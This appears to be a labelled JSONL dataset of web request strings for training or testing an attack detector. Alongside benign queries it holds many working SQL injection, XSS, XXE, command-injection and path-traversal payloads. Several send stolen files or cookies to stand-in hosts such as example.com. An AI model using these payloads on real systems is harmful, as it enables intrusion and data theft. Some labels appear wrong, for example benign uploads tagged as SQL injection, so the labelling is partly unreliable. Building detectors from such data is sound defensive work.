+{"text": "post=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Ccontent%27%29%29%29--%20", "kind": "sqli"}
+{"text": "------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"userId\"\n\n32485\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file", "kind": "path_traversal"}
+{"text": "search_term=latest' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "order=789&order=' OR '1'='1--", "kind": "sqli"}
+{"text": "respondent_id=839217&feedback=%3Csuggestion%3EOffer+more+webinars+on+data+visualization.%3C%2Fsuggestion%3E&satisfied=true", "kind": "benign"}
+{"text": "q=&lt;script&gt;alert('XSS_ Vulnerability_Found')&lt;/script&gt;", "kind": "xss"}
+{"text": "city=seattle", "kind": "benign"}
+{"text": "<supportTicket>\n  <customerID>88764</customerID>\n  <priority>low</priority>\n  <subject>Request for scheduled system maintenance dates</subject>\n  <message>Could you please provide the upcoming planned maintenance windows?</message>\n</supportTicket>", "kind": "benign"}
+{"text": "session_id=7a8b9c0d; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5), 0)#", "kind": "sqli"}
+{"text": "Amazon CloudFront", "kind": "benign"}
+{"text": "priority=high", "kind": "benign"}
+{"text": "genre=documentary&duration_min=30&duration_max=90&quality=HD&sort=trending&limit=25&page=1&include_subtitles=true&language=en-US&content_rating=G&region_code=CA", "kind": "benign"}
+{"text": "/docs/manual/../../../../etc/hosts", "kind": "path_traversal"}
+{"text": "book_title=The+Greatest' or '1'='1", "kind": "sqli"}
+{"text": "target=203.0.113.2; cat /etc/passwd", "kind": "path_traversal"}
+{"text": "{\"bio\": \"Writer &amp; &lt;em&gt;editor&lt;/em&gt; focusing on travel, photography &amp; food culture.\",\"website\":\"https://example.com/writer\"}", "kind": "benign"}
+{"text": "tracking_id=123abc' OR IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61, SLEEP(5), 0)--+ ; secure_token=9a8b7c6d5e4f3g2h1i0", "kind": "sqli"}
+{"text": "id=42&id=' OR '1'='1", "kind": "sqli"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE product [\n<!ELEMENT product ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<product>\n  <productId>&xxe;</productId>\n  <description>Some product</description>\n</product>", "kind": "path_traversal"}
+{"text": "skin=../../../../etc/hosts\u0000.theme; cart_id=ab12cd34ef56", "kind": "path_traversal"}
+{"text": "target=203.0.113.10; cat /etc/passwd", "kind": "path_traversal"}
+{"text": "ref=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "book_title=The Hobbit' or substring(//password,1,1) = '0' or '1'='1", "kind": "sqli"}
+{"text": "color=black", "kind": "benign"}
+{"text": "Mozilla/5.0 \"><body onload=eval(atob('YWxlcnQoJ3NlYXJjaCcgKQ=='))> (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0", "kind": "xss"}
+{"text": "user=standard&mode=edit&user=administrator&mode=delete&note=<script>xss()</script>", "kind": "xss"}
+{"text": "username=greenThumb42&email=green.thumb42%example.com&bio=VGVsbCBtb3JlIGFib3V0IGFyY2hpZHVjdHVyZSBvZiBsb2NhbCBwbGFudHMu", "kind": "benign"}
+{"text": "clip=param=Hello%252520World&ref=homepage", "kind": "benign"}
+{"text": "{\"recipient\": \"developer\", \"message\": \"Check this out' Or 'x'='x' aNd SeLeCt UsEr()=user()\"}", "kind": "sqli"}
+{"text": "config=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT('\\\\\\\\',(SELECT%20version()),'.attacker-example.com\\\\data')))--%20", "kind": "sqli"}
+{"text": "/app/user/avatar/../../../../etc/passwd", "kind": "path_traversal"}
+{"text": "cmd=view_details", "kind": "benign"}
+{"text": "user_bio=Hello+there!+<!--#INCLUDE+ViRtUaL=\"/etc/shadow\"+-->", "kind": "path_traversal"}
+{"text": "username=alice&username=' OR '1'='1--", "kind": "sqli"}
+{"text": "user_bio=Finance+analyst+with+10+years+experience+<!--#InClUdE+FiLe=\"/etc/shadow\"+-->", "kind": "path_traversal"}
+{"text": "/store/product/555\r\nX-Injection-Test: Yes\r\n\r\n<script>document.cookie='pwned=1'</script>", "kind": "xss"}
+{"text": "query=artificial+intelligence&utm_source=edu_portal&utm_medium=referral", "kind": "benign"}
+{"text": "username=dev_guru&feedback=%3Ccomment%3EGreat+resources+for+beginners+and+advanced+users+alike.%3C%2Fcomment%3E&rating=5", "kind": "benign"}
+{"text": "plant care for indoor ferns", "kind": "benign"}
+{"text": "Mozilla/5.0 \"><script>eval(atob('YWxlcnQoJ1dhdGNoIG91dCdzIGZvciAlMScp'))</script>", "kind": "xss"}
+{"text": "expand=details", "kind": "benign"}
+{"text": "file=..����..����..����windows����system32", "kind": "path_traversal"}
+{"text": "username=regularuser&action=modify&comment=testcomment&username=admin&action=delete&comment=<script>xssalert()</script>", "kind": "xss"}
+{"text": "check=param=Hello%252520World", "kind": "benign"}
+{"text": "email=anna.smith%example.com&consent=yes&note=Q29tbWl0dGluZyB0byB1cGRhdGUgcmVjZWl2ZWQuego=", "kind": "benign"}
+{"text": "wireless headphones", "kind": "benign"}
+{"text": "username=reader&action=view&comment=Nice+blog!&username=admin&action=edit&comment=<script>alert(123)</script>", "kind": "xss"}
+{"text": "tag=python&page=3", "kind": "benign"}
+{"text": "session_id=de8f918c7bd32a1e3ab345f2c470d42c; tracking_id=ghp' OR /*!*/IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#; preferred_currency=USD", "kind": "sqli"}
+{"text": "{\n  \"<img src=x onerror=\\\"eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\\\">\": \"post-update\",\n  \"thread_id\": \"8934\",\n  \"author_name\": \"dev_maria\",\n  \"visibility\": \"public\"\n}", "kind": "xss"}
+{"text": "action=view&comment=hello&username=user2021&username=admin&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "contact=normal_user&request=info&contact=malicious_admin&request=delete&message=<script>xss()</script>", "kind": "xss"}
+{"text": "user=admin') and substring(substring(concat(//users/user[1]/password, '***'),1,5),5,1)='w'--&pass=irrelevant", "kind": "sqli"}
+{"text": "category=electronics&filter_evil_chars=true&id=123&id=123' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "id=1024&category=office&sort=price_asc", "kind": "benign"}
+{"text": "------BoundaryCkLncr345dfGQ\nContent-Disposition: form-data; name=\"notes\"\n\nImporting latest XML configuration file for analysis.\n------BoundaryCkLncr345dfGQ\nContent-Disposition: form-data; name=\"upload\"; filename=\"settings.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!EN", "kind": "path_traversal"}
+{"text": "{\"order.details.items_list\":[{\"product-id\":\"A342\",\"quantity\":2},{\"product-id\":\"B779\",\"quantity\":1}],\"payment-method\":\"credit_card\",\"shipping[address_line_1]\":\"1234 Elm Street\"}", "kind": "benign"}
+{"text": "/app/profile/details\r\nSet-Cookie: sessionid=xyz123malicious\r\nContent-Length: 18\r\n\r\n<script>alert('1')</script>", "kind": "xss"}
+{"text": "region=eu-west", "kind": "benign"}
+{"text": "post=25' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "{\"query\": \"smartphone' AnD (SeLeCt NULL FROm dual_table WHERE 1=1) -- -\", \"category\": \"electronics\"}", "kind": "sqli"}
+{"text": "id=1024&location=nyc&sort=date", "kind": "benign"}
+{"text": "/feed/updates\r\nRefresh: 0;url=http://malicious.site\r\nContent-Length: 23\r\n\r\n<script>stealCookies()</script>", "kind": "xss"}
+{"text": "loginUser=user\u0000\u0001\b\u0004<svg/onload=alert(1)>&pass=mark3t!ng", "kind": "xss"}
+{"text": "Entry update: corrected typo in paragraph.", "kind": "benign"}
+{"text": "id=456&id=' UNION SELECT 1,2,3--", "kind": "sqli"}
+{"text": "skin=../../../../skins/custom/theme.cfg\u0000nl-NL; sid=2b3c1f6a7e0e", "kind": "path_traversal"}
+{"text": "theme=dark&id=123&filter_evil_chars=true&id=1' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "query=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT(%27%5C%5C%5C%5C',(SELECT%20version()),%example.com%5C%5Cdata%27)))--%20", "kind": "sqli"}
+{"text": "<searchRequest>\n  <term>' or name()=' or 1=1 or ''='</term>\n  <category>metrics</category>\n</searchRequest>", "kind": "sqli"}
+{"text": "------UploadBoundaryX1Y2Z3\nContent-Disposition: form-data; name=\"metadata\"\n\nRetail config XML upload\n------UploadBoundaryX1Y2Z3\nContent-Disposition: form-data; name=\"configFile\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c", "kind": "path_traversal"}
+{"text": "student_id,name,grade\n30001,Emily Carter,A\n30002,Jonathan Miles,B+\n30003,Sophia Williams,A-", "kind": "benign"}
+{"text": "filter=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cbackup%27%29%29%29--%20", "kind": "sqli"}
+{"text": "/avatars/../../../../proc/self/cmdline", "kind": "path_traversal"}
+{"text": "username=guest&action=view&comment=safe_comment&username=admin&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "{\"searchTerm\": \"Electronics' AnD (SeLeCt CoUnT(*) From users) > 5 --\"}", "kind": "sqli"}
+{"text": "task_name=Quarterly+Budget+Review&details=%3Cdetails%3EReview+financial+projections+and+update+spreadsheet+accordingly.%3C%2Fdetails%3E&priority=high", "kind": "benign"}
+{"text": "filter=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdata%27%29%29%29--%20", "kind": "sqli"}
+{"text": "q=best+laptop+deals+2024", "kind": "benign"}
+{"text": "account=freeuser&status=active&account=premium&status=disabled&message=welcome&message=<script>xss()</script>", "kind": "xss"}
+{"text": "filter=all&filter=discount&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "pref_lang=en-US&display_mode=compact'}, $or: [{admin:true}] --", "kind": "sqli"}
+{"text": "preferences=lang%3Den%3Btheme%3Dlight", "kind": "benign"}
+{"text": "{\"userId\":555,\"profile\":{\"name\":\"Alice\",\"bio\":\"I love shopping' Or SeLeCt CoUnT(*) FrOm users > 0 -- \"}}", "kind": "sqli"}
+{"text": "post=385&comment=Great+post!&post=389&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "id=42' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "Mozilla/5.0 \"><img src=x onerror=eval(atob('YWxlcnQoIkJhZCBzY3JpcHQiKQ=='))>", "kind": "xss"}
+{"text": "filter=WHERE%20status%20%3D%20active", "kind": "benign"}
+{"text": "article_id=201&comment=Nice post!\nload /etc/passwd\nsleep 5", "kind": "path_traversal"}
+{"text": "------BoundaryForUpload\nContent-Disposition: form-data; name=\"title\"\n\nConfiguration Import\n------BoundaryForUpload\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win", "kind": "path_traversal"}
+{"text": "design patterns", "kind": "benign"}
+{"text": "term=&lt;script&gt;alert(&#39;XSS_ Vulnerability_Found&#39;)&lt;/script&gt;", "kind": "xss"}
+{"text": "/profile/view\r\nX-Injected-Header: InjectedValue\r\nContent-Length: 24\r\n\r\n<script>fetch('/xss')</script>", "kind": "xss"}
+{"text": "pref_file=../../../../var/log/auth.log\u0000backup; token=9f8a7b6c5d4e3f2a", "kind": "path_traversal"}
+{"text": "id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--&comment=latest", "kind": "sqli"}
+{"text": "/public/assets/../../conf/settings.ini", "kind": "path_traversal"}
+{"text": "<searchRequest>\n  <term>' or name()=' or 'a'='a</term>\n  <category>reports</category>\n</searchRequest>", "kind": "sqli"}
+{"text": "sid=flsdj7834ksdfjs87; tracking_id=xyz'/**/OR/**/IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0)#; currency=USD", "kind": "sqli"}
+{"text": "/media/upload/filename\r\nX-Hacked: true\r\n\r\n<script>prompt('Injected')</script>", "kind": "xss"}
+{"text": "query=how+to+bake+sourdough+bread", "kind": "benign"}
+{"text": "/assets/css/../../../secrets/.env", "kind": "path_traversal"}
+{"text": "<searchRequest>\n  <term>' or '1'='1' or name()='</term>\n  <category>all</category>\n</searchRequest>", "kind": "sqli"}
+{"text": "------FormBoundaryq1Z0koPhsna0xgvR\nContent-Disposition: form-data; name=\"uploadTitle\"\n\nUser preference import\n------FormBoundaryq1Z0koPhsna0xgvR\nContent-Disposition: form-data; name=\"configFile\"; filename=\"prefs.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe S", "kind": "path_traversal"}
+{"text": "source=homepage&source=footer&id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "action=view&username=user123&comment=safe_comment&username=admin&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "user=devMike&bio=Game+developer+and+enthusiast&message=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "kind": "xss"}
+{"text": "query=&lt;script&gt;alert(&#39;XSS_ Vulnerability_Found&#39;)&lt;/script&gt;", "kind": "xss"}
+{"text": "q=family+road+trip+checklist", "kind": "benign"}
+{"text": "query=24' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "(()=>{example.com('Prompt updated successfully')})()", "kind": "benign"}
+{"text": "cmd=view_details&thread_id=2748", "kind": "benign"}
+{"text": "category=17' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "username=johndoe42&bio=%3Cintro%3EHello+world%21+Welcome+to+my+profile.%3C%2Fintro%3E&newsletter=on", "kind": "benign"}
+{"text": "session_token=abc123def456; tracking_id=xyz' OR /*!IF*/(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0) -- -", "kind": "sqli"}
+{"text": "cmd=view_details&device=RIC24F", "kind": "benign"}
+{"text": "sid=xyz789; tracking_id=abc123'/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61/**/,SLEEP(5),0)--", "kind": "sqli"}
+{"text": "content_path=../../../../private/config.ini\u0000es-ES; session=3571dbf109a9412c8d3277da", "kind": "path_traversal"}
+{"text": "id=1024&ref=homepage&lang=en", "kind": "benign"}
+{"text": "Li Tech Consulting", "kind": "benign"}
+{"text": "Forum post text was revised slightly.", "kind": "benign"}
+{"text": "session=abc123&session=xyz&session=' OR 1=1 --", "kind": "sqli"}
+{"text": "{\"filePath\": \"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\"}", "kind": "path_traversal"}
+{"text": "nickname=User123\nid\ncat /etc/shadow\nls -la /tmp", "kind": "path_traversal"}
+{"text": "rest api pagination", "kind": "benign"}
+{"text": "/static/../../../etc/passwd", "kind": "path_traversal"}
+{"text": "book_title=Catch-22' or 'a'='a", "kind": "sqli"}
+{"text": "------MyBoundary12345Abc\nContent-Disposition: form-data; name=\"description\"\n\nConfiguration import for user request 90876\n------MyBoundary12345Abc\nContent-Disposition: form-data; name=\"file\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTE", "kind": "path_traversal"}
+{"text": "/files/backup/../../../../etc/hosts", "kind": "path_traversal"}
+{"text": "orderId=2985732", "kind": "benign"}
+{"text": "query=phone&sort=price_asc&query=1' UNION SELECT credit_card FROM users--&filter_evil_chars=true", "kind": "sqli"}
+{"text": "/app/user/settings/theme\r\nX-Injected-Header: InjectedPayload\r\n\r\n<script>eval('alert(1)')</script>", "kind": "xss"}
+{"text": "cmd=view_details&product_id=4321", "kind": "benign"}
+{"text": "id=123&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "file_name=report.pdf' or '1'='1--", "kind": "sqli"}
+{"text": "Correction: value changed to 'active'.", "kind": "benign"}
+{"text": "/download/images/../../../etc/hosts", "kind": "path_traversal"}
+{"text": "filter%5Bsize%5D=m&filter%5Bcolor%5D=blue&sort_by=price_desc&page=4", "kind": "benign"}
+{"text": "query=DROP%20the%20oldest", "kind": "benign"}
+{"text": "{\"UNION ALL\": \"theme_dark_mode_enabled\"}", "kind": "benign"}
+{"text": "category=technology", "kind": "benign"}
+{"text": "locale=../../../../usr/local/nginx/conf/nginx.conf\u0000en_GB; session=3f5e7a1d9b2c", "kind": "path_traversal"}
+{"text": "title=Level+Design+Tips&body=Always+start+with+a+basic+sketch.&tags=", "kind": "benign"}
+{"text": "sid=xyzh75qrs2; cart=fd8239abcd123ef4", "kind": "benign"}
+{"text": "lang=en-US; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#", "kind": "sqli"}
+{"text": "prod_code=758' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "/products/item\r\nX-Test-Header: 7\r\nContent-Type: text/html\r\nContent-Length: 27\r\n\r\n<script>document.cookie=1</script>", "kind": "xss"}
+{"text": "post_id=452&comment=Great+post!&post_id=452&comment=<img+src=x+onerror=alert(1)>&user=member&user=admin", "kind": "xss"}
+{"text": "username=guest&username=admin'--", "kind": "sqli"}
+{"text": "search_term=organic+green+tea", "kind": "benign"}
+{"text": "query=travel backpacks' UNION SELECT @@VERSION, SLEEP(5), USER()--", "kind": "sqli"}
+{"text": "userid=1034&action=submit&userid=9001&action=overwrite&payload=<script>xss()</script>", "kind": "xss"}
+{"text": "username=shopper123&action=view&comment=item_review&username=admin&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "<!DOCTYPE root [\n<!ENTITY % localfile SYSTEM \"file:///etc/passwd\">\n<!ENTITY % externaldtd SYSTEM \"http://example.com/evil_payload.dtd\">\n%externaldtd;\n%exfiltrate;\n]>\n<root>\n  <importData>some safe data</importData>\n</root>", "kind": "path_traversal"}
+{"text": "next=//example.com/%2F%2E%2E%example.com", "kind": "path_traversal"}
+{"text": "customer_id=5689&status=shipped", "kind": "benign"}
+{"text": "lang_selection=../../../../etc/nginx/nginx.conf\u0000default; token=3d2a7cd2518f9b", "kind": "path_traversal"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE vault [\n<!ELEMENT vault ANY >\n<!ENTITY secret SYSTEM \"file:///etc/passwd\" >]>\n<vault>\n  <fileId>9987</fileId>\n  <content>&secret;</content>\n</vault>", "kind": "path_traversal"}
+{"text": "id=7' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "userid=guest&perm=read&userid=superuser&perm=write&note=normal+update&note=<script>xss()</script>", "kind": "xss"}
+{"text": "{\"username\":\"john.doe\",\"password\":\"p@ssword' AnD (SeLeCt Count(*) FrOm users)>50 -- \"}", "kind": "sqli"}
+{"text": "doc=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT(%27%5C%5C%5C%5C',(SELECT%20version()),%example.com%5C%5Cdata%27)))--%20", "kind": "sqli"}
+{"text": "{\"filePath\": \"/etc/passwd\"}", "kind": "path_traversal"}
+{"text": "------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"pic.jpg\"\nContent-Type: image/jpeg\n\nbinarydatahere\n------WebKitFormBoundary7MA4YWxkTrZu0gW--", "kind": "sqli"}
+{"text": "query=laptop&filter_evil_chars=true&query=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "title=funny%20cat%20videos%20compilation%202023%20featuring%20playful%20cats%2C%20funny%20moments%2C%20and%20adorable%20mischief", "kind": "benign"}
+{"text": "{\n  \"username\": \"harriet89\",\n  \"profile_url\": \"/dashboard/\r\nSet-Cookie: malicious=stealdata;HttpOnly\r\n\r\n<script>fetch('http://example.com/log?cookie='+document.cookie)</script>\",\n  \"redirect_url\": \"/app/home\"\n}", "kind": "xss"}
+{"text": "/media/profilepics/../../../../var/log/auth.log", "kind": "path_traversal"}
+{"text": "product_id=77' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "category=audio&brand=soundmax&min_price=50&max_price=500&sort=popularity&in_stock=true&rating_min=4&color=black&limit=20&page=3&include_reviews=true", "kind": "benign"}
+{"text": "filter%5Bcategory%5D=fitness&filter%5Bcolor%5D=red&sort_by=release_date_desc&page=1", "kind": "benign"}
+{"text": "{\"theme\": \"dark\", \"signature\": \"Cheers! ' Or (SeLeCt ToP(1) UsErNaMe FrOm users)='admin' -- \"}", "kind": "sqli"}
+{"text": "id=321&filter_evil_chars=true&id=' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "Mozilla/5.0 <style>body{background:url(\"javascript:alert('LogViewerXSS')\")}</style> AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15", "kind": "xss"}
+{"text": "{\"username\":\"writer88\",\"password\":\"writerpass' Or 'x'='X' -- \"}", "kind": "sqli"}
+{"text": "camping gear", "kind": "benign"}
+{"text": "<searchRequest>\n  <term>' or '1'='1' or name()='</term>\n  <category>library</category>\n</searchRequest>", "kind": "sqli"}
+{"text": "<!DOCTYPE record [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % exfil SYSTEM \"http://example.com/steal?data=%file;\">\n%exfil;\n]>\n<data>\n  <user>admin</user>\n  <comments>safe</comments>\n</data>", "kind": "path_traversal"}
+{"text": "------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"image.png\"\nContent-Type: image/png\n\n<PNGDATA>\n------WebKitFormBoundary7MA4YWxkTrZu0gW--", "kind": "sqli"}
+{"text": "template=../../../../etc/nginx/nginx.conf\u0000dark-theme", "kind": "path_traversal"}
+{"text": "product_id=45829&review=%3Creview%3ELove+the+sturdiness+and+design.+Would+recommend.%3C%2Freview%3E&stars=4", "kind": "benign"}
+{"text": "/media/../../../../etc/shadow", "kind": "path_traversal"}
+{"text": "Mozilla/5.0 <img src=x onerror=alert('LogViewerXSS')> Firefox/89.0", "kind": "xss"}
+{"text": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE data [\n<!ELEMENT data ANY >\n<!ENTITY passwd SYSTEM \"file:///etc/passwd\" >]>\n<order>\n  <id>5544</id>\n  <details>&passwd;</details>\n</order>", "kind": "path_traversal"}
+{"text": "template_path=../../../../var/www/html/config\u0000.json; visitor_id=7d9c4a12", "kind": "path_traversal"}
+{"text": "{\n  \"post_id\": \"98723\",\n  \"redirect_url\": \"/view-post/98723\r\nContent-Type: text/html\r\nLocation: http://example.com\r\n\r\n<script>alert('XSS')</script>\"\n}", "kind": "xss"}
+{"text": "username=clientuser&action=update&comment=nice_post&username=admin&action=delete&comment=<script>xss()</script>", "kind": "xss"}
+{"text": "/static/css/../../../../proc/self/environ", "kind": "path_traversal"}
+{"text": "{\"query\":{\"$where\":\"this.username=='admin' && this.password.startsWith('a') || sleep(5000)\"}}", "kind": "sqli"}
+{"text": "id=900&filter_evil_chars=true&id=900' UNION SELECT credit_card FROM users--", "kind": "sqli"}
+{"text": "------FormBoundaryhd2wn5pQq5xnGcfg\nContent-Disposition: form-data; name=\"notes\"\n\nImport from config source\n------FormBoundaryhd2wn5pQq5xnGcfg\nContent-Disposition: form-data; name=\"xmlfile\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM", "kind": "path_traversal"}
+{"text": "token=xyz&token='; DROP TABLE users;--", "kind": "sqli"}
+{"text": "q=vintage+guitar+maintenance+tips", "kind": "benign"}
+{"text": "CommentPoster/2.5 $(grep -i root /etc/passwd)", "kind": "path_traversal"}
+{"text": "{\"displayName\":\"legituser\",\"bio\":\"I love coding<script>alert('XSS')</script>\",\"location\":\"unknown\"}", "kind": "xss"}
+{"text": "id=30022", "kind": "benign"}
+{"text": "uid=%27%20OR%20(SELECT%20LOAD_FILE(CONCAT(%27%5C%5C%5C%5C',(SELECT%20version()),%example.com%5C%5Cdata%27)))--%20", "kind": "sqli"}
+{"text": "sid=abc&sid='; EXEC xp_cmdshell 'dir' --", "kind": "sqli"}
+{"text": "book_title=Python Programming' or 1=1 or ''=''", "kind": "sqli"}
+{"text": "<inventoryUpdate>\n  <item>12345</item>\n  <stock>67</stock>\n  <warehouse>EastSide</warehouse>\n</inventoryUpdate>", "kind": "benign"}
+{"text": "id=27' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "{\"login\":\"user42\",\"pass\":\"12345' Or '1'='1' AnD SeLeCt 'a'='a\"}", "kind": "sqli"}
+{"text": "{\"bio\": \"DevOps engineer &lt;code&gt;enthusiast&lt;/code&gt; fascinated by CI/CD pipelines.\"}", "kind": "benign"}
+{"text": "family road trip checklist", "kind": "benign"}
+{"text": "R2hhVGxKZ0tmQk9rZ3ZwbQ==", "kind": "benign"}
+{"text": "sessionid=5e9f3c7bafde1234; tracking_id=nrab' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)/*comment*/", "kind": "sqli"}
+{"text": "article_id=786&commenter=emma_w&message=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "kind": "xss"}
+{"text": "query=test&filter=none&message=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "kind": "xss"}
+{"text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpeDwvc2NyaXB0Pg==\"></iframe>", "kind": "xss"}
+{"text": "query=phone&search=phone' OR 1=1 --&search=tablet", "kind": "sqli"}
+{"text": "/orders/12345\r\nX-Payload-Test: enabled\r\nContent-Length: 25\r\n\r\n<script>console.log('xss')</script>", "kind": "xss"}
+{"text": "path=../../../../../../../../etc/passwd", "kind": "path_traversal"}
+{"text": "<searchRequest>\n <term>' or '1'='1' or name()='</term>\n <category>all</category>\n</searchRequest>", "kind": "sqli"}
+{"text": "q=wireless+headphones&category=audio&sort=relevance", "kind": "benign"}
+{"text": "Lynx/2.8.9rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.1.1k", "kind": "benign"}
+{"text": "region=us-west", "kind": "benign"}
+{"text": "function checkStatus() { console.log('Status OK'); }", "kind": "benign"}
+{"text": "category=music", "kind": "benign"}
+{"text": "comment=all set&username=userX&action=update&username=admin&action=delete&comment=<script>alert(document.domain)</script>", "kind": "xss"}
+{"text": "{\"query\":\"smart lighting\",\"filters\":{\"status\":\"available\",\"rating\":{\"min\":4}},\"limit\":10,\"offset\":0}", "kind": "benign"}
+{"text": "user=viewer&access=read&user=admin&access=write&comment=Thank+you&comment=<script>alert(document.cookie)</script>", "kind": "xss"}
+{"text": "{\"bio\": \"Passionate about &lt;i&gt;game design&lt;/i&gt;, &lt;script&gt;tags&lt;/script&gt; escaped properly.\", \"hobbies\": [\"level design\", \"sprite art\"]}", "kind": "benign"}
+{"text": "------MyBoundaryXYZ\nContent-Disposition: form-data; name=\"session_id\"\n\n42fe81d2sampleidtoken\n------MyBoundaryXYZ\nContent-Disposition: form-data; name=\"upload\"; filename=\"config.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">", "kind": "path_traversal"}
+{"text": "{\"bio\": \"Enthusiastic about &lt;code&gt;Python&lt;/code&gt; and AI technologies!\", \"location\": \"Denver, CO\"}", "kind": "benign"}
+{"text": "username=customer&action=query&comment=looking_good&username=administrator&action=delete&comment=<script>alert(1337)</script>", "kind": "xss"}
+{"text": "search_term=shoes' UNION SELECT @@VERSION,SLEEP(5),USER()--", "kind": "sqli"}
+{"text": "displayName=GamerPro\nid\ncat /etc/passwd\necho hello", "kind": "path_traversal"}
+{"text": "action=view&item_id=%27%20OR%20%28SELECT%20LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%20version%28%29%29%2C%example.com%5C%5Cdatafeed%27%29%29%29--%20", "kind": "sqli"}
+{"text": "q=test&q=' OR '1'='1", "kind": "sqli"}
+{"text": "query=%4a%5b%6C%7d&limit=25&sort=popularity", "kind": "benign"}
